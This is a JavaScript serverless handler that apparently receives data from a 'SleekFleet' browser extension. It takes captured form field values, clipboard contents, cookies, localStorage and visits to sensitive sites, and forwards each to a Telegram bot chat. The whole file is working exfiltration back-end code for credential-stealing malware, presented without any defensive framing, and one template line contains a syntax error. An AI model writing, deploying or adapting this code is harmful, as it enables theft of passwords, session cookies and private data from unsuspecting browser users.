export default async function handler(req, res) {
  // 1. Handle CORS Preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).json({});
  }

  // 2. Parse Body Correctly
  let payload = {};
  try {
    const rawBody = req.body || "";
    payload = typeof rawBody === 'string' ? JSON.parse(rawBody) : rawBody;
  } catch (e) {
    console.error("JSON Parse Error:", e);
    payload = {};
  }

  // 3. Check Method
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    // 4. Format Message Based on Source
    let msg = "";
    const timestamp = new Date().toISOString();
    const url = payload.url || "N/A";
    const field = payload.field_name || payload.source || "Unknown Field";

    if (payload.source === "input_field_capture") {
      msg = `
🚗 *SleekFleet Input Capture*

📍 Site: \`${url}\`
🏷️ Field: \`${field}\`
🔑 Value: \`${payload.value || "Empty"}\`
⏰ Time: \`${timestamp}\`
      `.trim();
    } else if (payload.source === "clipboard_sensitive" || payload.source === "clipboard_on_focus") {
      msg = `
🚗 *SleekFleet Clipboard Grab*

📋 Data: \`${payload.data || "Empty"}\`
📍 Context: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();
    } else if (payload.source === "cookie_dump") {
      msg = `
🚗 *SleekFleet Cookie Dump*

🍪 Cookies: \`${payload.data || "None"}\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();
    } else if (payload.source === "local_storage_dump") {
      const lsData = typeof payload.data === 'object' ? JSON.stringify(payload.data) : payload.data;
      msg = `
🚗 *SleekFleet Local Storage Dump*

💾 Data: \`${lsData.substring(0, 100)}...\`
📍 Site: \`${url}\`
⏰ Time: \`${timestamp}\`
      `.trim();
    } else if (payload.source === "tab_navigated_to_sensitive_site") {
      msg = `
🚗 *SleekFleet Sensitive Site Visit*

🌐 URL: \`${payload.data.url}\`
📝 Title: \`${payload.data.title}\`
⏰ Time: \`${timestamp}\`
      `.trim();
    } else if (payload.source === "url_change") {
      msg = `
🚗 *SleekFleet URL Change*

🌐 URL: \`${payload.url}\`
📝 Title: \`${payload.title}\`
⏰ Time: \`${timestamp}\`
      `.trim();
    } else {
      msg = `
🚗 *SleekFleet Generic Data*

📋 Data: \`${JSON.stringify(payload)\}`
⏰ Time: \`${timestamp}\`
      `.trim();
    }

    // 5. Send to Telegram
    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
    const tgChatId = process.env.TELEGRAM_CHAT_ID;

    if (tgToken && tgChatId) {
      try {
        const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); 

        const response = await fetch(tgUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: tgChatId, 
            text: msg, 
            parse_mode: 'Markdown' 
          }),
          signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
          console.error(`Telegram API Error: ${response.status} ${response.statusText}`);
        } else {
          console.log("✅ Telegram Message Sent");
        }
      } catch (err) {
        console.error("❌ Telegram Fetch Failed:", err.message);
      }
    } else {
      console.log("⚠️ Telegram skipped: Missing Env Vars");
      // For debugging, log the message
      console.log("Payload:", msg);
    }

    // 6. Return Success to Extension
    res.status(200).json({ success: true });

  } catch (error) {
    console.error("💥 Handler Error:", error);
    res.status(500).json({ error: error.message });
  }
}
